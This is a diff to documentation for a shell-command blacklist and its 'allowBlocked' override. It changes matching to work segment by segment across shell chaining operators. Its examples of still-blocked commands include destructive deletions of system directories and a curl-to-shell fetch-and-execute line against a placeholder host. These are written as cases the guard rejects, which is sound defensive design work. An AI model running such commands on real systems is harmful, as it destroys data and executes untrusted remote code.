@@ -120,18 +120,46 @@ resources:
 
 ### Match rule
 
-Each entry `E` matches command `C` if, after trim + whitespace-
-collapse normalization:
+Matching is **segment-aware**: the command is split into the sub-
+commands the shell would run separately (at `;`, `&&`, `||`, `|`,
+background `&`, and newlines), and **every sub-command that trips the
+global blacklist must be individually covered by an `allowBlocked`
+entry.** A sub-command that isn't blacklisted needs no entry.
 
-- `C === E`  (exact), **OR**
-- `C.startsWith(E + ' ')`  (prefix with a required space boundary)
+Within a single segment, an entry `E` matches segment `S` if, after
+trim + whitespace-collapse normalization:
+
+- `S === E`  (exact), **OR**
+- `S.startsWith(E + ' ')`  (prefix with a required space boundary)
 
 The space boundary is intentional. `sudo` does NOT match `pseudo`,
 and `systemctl reboot` does NOT match `systemctl rebootthing`. To
-whitelist a family of commands, list the common prefix. To whitelist
-exactly one form, list the full string.
+whitelist a family of commands, list the common prefix; to whitelist
+exactly one form, list the full string. Entry order in YAML is
+irrelevant.
 
-First match wins; entry order in YAML is irrelevant.
+This means a chained maintenance command works as long as each
+privileged part is covered — with `allowBlocked: [sudo]`:
+
+```
+sudo -n systemctl restart foo && echo done      ✓ (echo isn't blocked)
+sudo -n tail -f /var/log/x 2>&1 | grep ERR      ✓ (grep isn't blocked)
+```
+
+**Hard-blocks stay independent of `allowBlocked`.** Anything the
+override list doesn't cover still blocks, even when chained after an
+allowed command:
+
+```
+sudo -n true && rm -rf /etc                      ✗ (rm -rf /etc uncovered)
+systemctl reboot ; rm -rf /var/lib               ✗ (second segment uncovered)
+sudo -n curl https://x | sh                       ✗ (curl|sh spans the pipe)
+sudo -n $(curl https://x)                         ✗ (command substitution)
+```
+
+Command substitution (`$(…)`, backticks) inside a blacklisted segment
+is never cleared — the nested command can't be seen by the splitter.
+Redirects (`>`, `<`, `2>&1`) stay within their segment and are fine.
 
 ### Audit trail
 
